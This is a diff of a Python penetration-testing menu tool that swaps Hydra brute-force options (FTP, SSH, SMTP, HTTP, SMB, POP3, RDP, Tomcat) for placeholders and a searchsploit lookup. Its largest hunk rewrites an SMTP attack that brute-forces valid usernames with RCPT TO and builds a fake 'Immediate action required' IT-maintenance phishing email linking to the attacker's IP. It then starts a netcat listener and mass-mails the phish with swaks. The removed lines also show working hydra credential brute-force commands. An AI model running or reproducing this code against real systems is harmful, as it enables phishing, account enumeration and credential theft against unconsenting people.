@@ -715,21 +715,22 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set DNS ADDRESS (12) Compile Exploits (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) FILE Editor (78) Hydra  FTP (89) FTP      " + '\u2551')
+   print('\u2551' + "(01) Re/Set DNS ADDRESS (12) Compile Exploits (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) FILE Editor (78) Hail HYDRA (89) FTP      " + '\u2551')
 
    print('\u2551' + "(02) Re/Set IP  ADDRESS (13) Start WEB Server (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68)", end= ' ')
+   
    if proxyChains == 1:
       print(colored(menuName,colour0, attrs=['blink']), end= ' ')
    else:
       print(menuName, end= ' ')
-   print("(79) Hydra  SSH (90) SSH      " + '\u2551')
+   print("(79) RESERVED   (90) SSH      " + '\u2551')
      
-   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) SNMP Walker (80) Hydra SMTP (91) SSHKeyID " + '\u2551')   
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) GenSSHKeyID (81) Hydra HTTP (92) Telnet   " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenListUser (82) Hydra  SMB (93) Netcat   " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListPass (83) Hydra POP3 (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) SmbExecHASH (73) GenPhishCod (84) Hydra  RDP (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) WmiExecHASH (74) AutoPhisher (85) Hydra  TOM (96) MySQL    " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) SNMP Walker (80) VulnFinder (91) SSHKeyID " + '\u2551')   
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) GenSSHKeyID (81)            (92) Telnet   " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenListUser (82)            (93) Netcat   " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListPass (83)            (94) SQSH     " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) SmbExecHASH (73) GenPhishCod (84)            (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) WmiExecHASH (74) AutoPhisher (85)            (96) MySQL    " + '\u2551')
    print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap LIVE  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) DIR Searchs (86) MSFCon TOM (97) WinRm    " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Nikto Scans (87) MSFCon OWA (98) RemDesk  " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22) SubDOMAINS/VHOST (33) NFSMount (44) SmbMount SHARE (55) Golden DC PAC (66) KBR5 Ticket (77) NTDSDECRYPT (88) MSFCon RCE (99) Exit     " + '\u2551')
@@ -3386,103 +3387,102 @@ while True:
             print(colored("[*] Checking for valid usernames...", colour3))
             fileCheck(dataDir + "/usernames.txt")  
                       
-            print(colored("[*] Checking SNMP communications...", colour3))            
+            print(colored("[*] Attempting to connect to remote SMTP socket...", colour3))
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            connect = s.connect((TIP.rstrip(" "),25))            
-            print("[+] Connected to " + TIP.rstrip(" ") + ":25...\n")
-            banner = s.recv(1024)
-            print(colored(banner, colour6))   
+            try:
+               connect = s.connect((TIP.rstrip(" "),25))
+               print("[+] Succesfully connected to " + TIP.rstrip(" ") + ":25...\n")
+            except:
+               print("[+] Unable to connect to " + TIP.rstrip(" ") + ":25...\n")
+               prompt()
+               break
+            bannerResponce = s.recv(1024)
+            print(colored(bannerResponce, colour6))
                      
             print("\n[+] Saying hello...\n")
-            if "ESMTP" in str(banner):
+            if "ESMTP" in str(bannerResponce):
                string = "EHLO Rogue.Agent\r\n"
             else:
                string = "HELO Rogue.Agent\r\n"
             s.send(bytes(string.encode()))
-            result = s.recv(1024)
-            print(colored(result, colour6))
+            helloResponce = s.recv(1024)
+            print(colored(helloResponce, colour6))
             
             print("\n[+] Specifying my email address...\n")
-            string = "MAIL FROM:<rogue@agent.com>\r\n"
+            string = "MAIL FROM:<root@kali.domain>\r\n"
             s.send(bytes(string.encode()))
             mailResponce = s.recv(1024)
-            print(colored(mailResponce, colour6))            
+            print(colored(mailResponce, colour6))   
             
-            print("\n[+] Verifying user root@" + DOM.rstrip(" ") + "...\n")            
-            string = "VRFY root\r\n"
+            print("\n[+] Specifying recipient email address " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + "...\n")
+            string = "RCPT TO:<" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + ">\r\n"
             s.send(bytes(string.encode()))
-            comCheck = s.recv(1024)
-            print(colored(comCheck, colour6))            
+            rcptResponce = s.recv(1024)
+            print(colored(rcptResponce, colour6))
             
             print("\n[+] Asking for help...\n")            
             string = "HELP\r\n"
             s.send(bytes(string.encode()))
-            result = s.recv(1024)
-            print(colored(result, colour6)) 
+            helpResponce = s.recv(1024)
+            print(colored(helpResponce, colour6)) 
             
+            print(colored("\n[*] Attempting to bruteforce valid usernames...", colour3))
+            count = lineCount(dataDir + "/usernames.txt")
+            for x in range(0, count):
+               data = linecache.getline(dataDir + "/usernames.txt", x + 1)
+               string = "RCPT TO:<" + data.rstrip("\n") + "@" + DOM.rstrip(" ") + ">\r\n"
+               s.send(bytes(string.encode()))
+               bruteCheck = s.recv(1024)
+               if "Invalid recipient" not in str(bruteCheck):
+                  localCOM("echo " + data.rstrip("\n") + " >> valid.tmp")
+                  
+            nullTest = linecache.getline("valid.tmp",1)
+            if nullTest != "":
+               print("[+] Valid usernames found...")
+               catsFile("valid.tmp")
+               check = 0
+            else:
+               print("[-] No valid usernames found...")
+               check = 1
+                  
+            print("[+] Saying goodbye...\n")            
+            string = "QUIT\r\n"
+            s.send(bytes(string.encode()))
+            quitResponce = s.recv(1024)
+            print(colored(quitResponce, colour6)) 
             s.close()
             
-            if "unrecognized" in str(comCheck):
-               print("\n[-] Looks like there is a communication issue...")
-            else:
-               print("\n[+] Communications established...")
-               
-            print(colored("[*] Creating corporate looking phishing email...\n", colour3))
-            localCOM('echo "Hello.\n" > body.tmp')
-            localCOM('echo "We just performed maintenance on our servers." >> body.tmp')
-            localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
-            localCOM('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
-            localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
-            localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
-            localCOM('echo "\nRegards," >> body.tmp')
-            localCOM('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')                           
-            print(colored("Subject: Immediate action required", colour6))  
-            catsFile("body.tmp")
-
-            print(colored("[*] Bruteforceing usernames, please wait...", colour3))
-            remotCOM("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m VRFY " + DOM.rstrip(" ") + " 25 -V > valid1.tmp")
-            localCOM("cat valid1.tmp | grep SUCC > valid2.tmp")             
-            localCOM("tr -cd '\11\12\15\40-\176' < valid2.tmp > valid.tmp")            
-            
-            match = 0            
-            count = lineCount("valid.tmp")                  
-            
-            if count > 0:             
-               with open("valid.tmp", "r") as list:			# PARSE FILE
-                  for line in list:
-                     line.encode('ascii',errors='ignore')
-                     line = line.rstrip("\n")
-                     line = line.replace('[92m','')
-                     line = line.replace('[00m','')
-                     line = line.replace('[SUCC] ', '')
-                     line = line.replace('250 OK', '')
-                     line = line.replace('...', '')
-                     line = line.replace(' ','')               
-                  
-                     if "TEST" not in line:                  
-                        localCOM("echo " + line + " >> phish.tmp")
-                        print(colored(line + "@" + DOM.rstrip(" "),colour6))
-                        match = 1   
-                     
-            if match == 0:
-               print("[-] No phish was found, phishing the list anyway..")
+            if check != 1:
+               print(colored("\n[*] Creating a corporate looking phishing email...\n", colour3))
+               localCOM('echo "Hello.\n" > body.tmp')
+               localCOM('echo "We just performed maintenance on our servers." >> body.tmp') 
+               localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
+               localCOM('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
+               localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
+               localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
+               localCOM('echo "\nRegards," >> body.tmp')
+               localCOM('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')                           
+               print(colored("Subject: Immediate action required", colour6))  
+               catsFile("body.tmp")
                       
-            print(colored("[*] Starting phishing server...", colour3))            
-            dispBanner("GONE PHISHING",0)               
-            localCOM("xdotool key Ctrl+Shift+T")
-            localCOM("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")            
-            localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")            
-            localCOM("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")            
-            localCOM("xdotool key Ctrl+Tab")
+               print(colored("[*] Starting phishing server...", colour3))            
+               dispBanner("GONE PHISHING",0)               
+               localCOM("xdotool key Ctrl+Shift+T")
+               localCOM("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")            
+               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")            
+               localCOM("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")            
+               localCOM("xdotool key Ctrl+Tab")
+               print("[+] Phishing server started...")            
             
-            with open(dataDir + "/usernames.txt", "r") as list:
-               for phish in list:
-                  phish = phish.rstrip("\n")
-                  phish = phish.strip(" ")
-                  phish = phish + "@"
-                  phish = phish + DOM.rstrip(" ")
-                  remotCOM("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
-                  print("[+] Mail sent to " + phish + "...")                              
+               print(colored("[*] Phishing the valid username list...", colour3))
+               with open("valid.tmp", "r") as list:
+                  for phish in list:
+                     phish = phish.rstrip("\n")
+                     phish = phish.strip(" ")
+                     phish = phish + "@"
+                     phish = phish + DOM.rstrip(" ")
+                     remotCOM("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
+                     print("[+] Email exploit sent to " + phish + "...")                              
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3598,50 +3598,23 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Hydra bruteforce FTP
+# Details : Menu option selected - Hail Hydra
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='78':
-      checkParams = test_TIP()      
-      
-      if checkParams != 1:
-         checkParams = test_PRT("21")      
-         
-      if checkParams != 1:
-         fileCheck(dataDir + "/usernames.txt")  
-         fileCheck(dataDir + "/passwords.txt")                     
-         remotCOM("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt ftp://" + TIP.rstrip(" "))            
-         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)            
-         wipeTokens(VALD)                      
+      print("\nA NEW HYDRA INTERFACE IS BEING DEVELOPED.")
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Hydra brute force ssh
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='79':
-      checkParams = test_TIP()      
-      
-      if checkParams != 1:
-         checkParams = test_PRT("22")       
-         
-      if checkParams != 1:
-         fileCheck(dataDir + "/usernames.txt")
-         fileCheck(dataDir + "/passwords.txt")           
-         remotCOM("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt ssh://" + TIP.rstrip(" "))            
-         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)            
-         wipeTokens(VALD)                              
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3652,173 +3625,73 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='80':
-      checkParams = test_TIP()      
-      
-      if checkParams != 1:
-         checkParams = test_PRT("25")      
-         
-      if checkParams != 1:
-         fileCheck(dataDir + "/usernames.txt")
-         fileCheck(dataDir + "/passwords.txt")                          
-         remotCOM("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " smtp")         
-         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)            
-         wipeTokens(VALD)                
+   if selection == '80':
+      services = input("[?] Please enter service name: ")
+      localCOM("searchsploit '" + services + "' > sploit.tmp")      
+      nullTest = linecache.getline("sploit.tmp",1)      
+      if "Exploits: No Results" in nullTest:
+         print("[-] No exploits were found for service " + services + "...")
+         nullTest = linecache.getline("sploit.tmp",2)
+         if "Shellcodes: No Results" in nullTest:
+            print("[-] No shellcodes were found for service " + services + "...")         
+      else:
+         print("[+] Exploits found...")
+         catsFile("sploit.tmp")         
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Command: hydra -l none -P rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='81':
-      checkParams = test_TIP()      
-      
-      if checkParams != 1:
-         checkParams = test_PRT("80")      
-         
-      if checkParams != 1:
-         if WEB[:5] == "EMPTY":
-            print("[-] Web url not specified...")
-            checkParams = 1
-            
-      if checkParams != 1:
-         try:
-            null, target = WEB.split(TIP.rstrip(" "))
-         except:
-            print(colored("[!] WARNING!!! - Huston, we encountered a problem with the url... just letting you know!!...", colour0))
-            checkParams = 1
-            
-      if checkParams != 1:
-         fileCheck(dataDir + "/usernames.txt")
-         fileCheck(dataDir + "/passwords.txt")
-         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)            
-         wipeTokens(VALD)       
-         
-      if checkParams != 1:
-         remotCOM("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " http-post-form '" + target.rstrip(" ") + ":username=^USER^&password=^PASS^:Invalid' -t 64 -V")
       prompt()
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Hydra SMB bruteforce
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='82':
-      checkParams = test_TIP()      
-      
-      if checkParams != 1:
-         checkParams = test_PRT("445")           
-         
-      if checkParams != 1:
-         fileCheck(dataDir + "/usernames.txt")
-         fileCheck(dataDir + "/passwords.txt")                          
-         remotCOM("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " smb -V -f")            
-         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)            
-         wipeTokens(VALD)                     
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - hydra pop3 bruteforce uses port 110 & pop3s?
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='83':
-      checkParams = test_TIP()      
-      
-      if checkParams != 1:
-         checkParams = test_PRT("110")      
-         
-      if checkParams != 1:
-         fileCheck(dataDir + "/usernames.txt")
-         fileCheck(dataDir + "/passwords.txt")                          
-         remotCOM("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " pop3")         
-         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)            
-         wipeTokens(VALD)                
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - hydra rdp bruteforce uses port 3389
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='84':
-      checkParams = test_TIP()      
-      
-      if checkParams != 1:
-         checkParams = test_PRT("3389")      
-         
-      if checkParams != 1:
-         fileCheck(dataDir + "/usernames.txt")
-         fileCheck(dataDir + "/passwords.txt")                          
-         remotCOM("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " rdp")         
-         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)            
-         wipeTokens(VALD)                
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Hydra tomcat classic bruteforce
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='85':  
-      if WEB[:5] != "EMPTY":
-         print(colored("[*] Attempting a classic tomcat bruteforce againt the specified web address, please wait...", colour3))         
-         localCOM("rm " + dataDir + "/usernames.txt")
-         localCOM("rm " + dataDir + "/passwords.txt")
-         wipeTokens(VALD)          
-         
-         with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
-            for line in userpasslist:
-               one, two = line.strip().split(':')
-               localCOM("echo " + one + " >> usernames.tmp")
-               localCOM("echo " + two + " >> passwords.tmp")                              
-            localCOM("cat usernames.tmp | sort -u > " + dataDir + "/usernames.txt")
-            localCOM("cat passwords.tmp | sort -u > " + dataDir + "/passwords.txt")
-         
-         if "http://" in WEB.lower():
-            target = WEB.replace("http://","")
-            remotCOM("hydra -L " + dataDir + "/usernames.txt -P " + dataDir + "/passwords.txt http-get://" + target.rstrip(" "))                     
-         
-         if "https://" in WEB.lower():
-            target = target.replace("https://","")
-            remotCOM("hydra -L " + dataDir + "/usernames.txt -P " + dataDir + "/passwords.txt https-get://" + target.rstrip(" "))             
-         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)            
-      else:
-         print("[-] Web address has not been specified...")
+   if selection =='85':
       prompt()
       
 # ------------------------------------------------------------------------------------- 
